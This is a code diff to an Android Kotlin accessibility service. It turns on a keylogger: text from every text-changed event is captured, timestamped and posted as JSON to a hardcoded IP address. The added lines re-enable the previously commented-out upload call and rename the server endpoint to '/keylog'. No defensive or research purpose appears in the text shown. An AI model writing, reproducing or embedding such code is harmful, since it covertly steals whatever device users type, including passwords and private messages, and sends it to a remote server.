@@ -11,20 +11,26 @@ import org.json.JSONObject
 import java.io.OutputStreamWriter
 import java.net.HttpURLConnection
 import java.net.URL
+import java.text.SimpleDateFormat
+import java.util.Locale
+import java.util.Date
 
 class MyAccessibilityService : AccessibilityService() {
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
         when (event?.eventType) {
             AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                 val text = event.text.toString()
+                val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())
+//                val uuid = SystemDetails.getUUID(this)
                 Log.d("AccessibilityService", "Text changed: $text")
                 val details = JSONObject().apply {
+//                    put("UUID", uuid)
                     put("EventType", "Text Changed")
                     put("Details", text)
-                    // Add any additional details you want to log
+                    put("Timestamp", timestamp)
                 }
                 GlobalScope.launch(Dispatchers.IO) {
-//                    sendDetailsToServer(details)
+                sendDetailsToServer(details)
                 }
             }
             // Handle other event types if needed
@@ -32,7 +38,7 @@ class MyAccessibilityService : AccessibilityService() {
     }
 
     private fun sendDetailsToServer(details: JSONObject) {
-        val url = URL("http://13.92.41.98:5000/submit_details")
+        val url = URL("http://13.92.41.98:5000/keylog")
         val connection = url.openConnection() as HttpURLConnection
         try {
             connection.doOutput = true
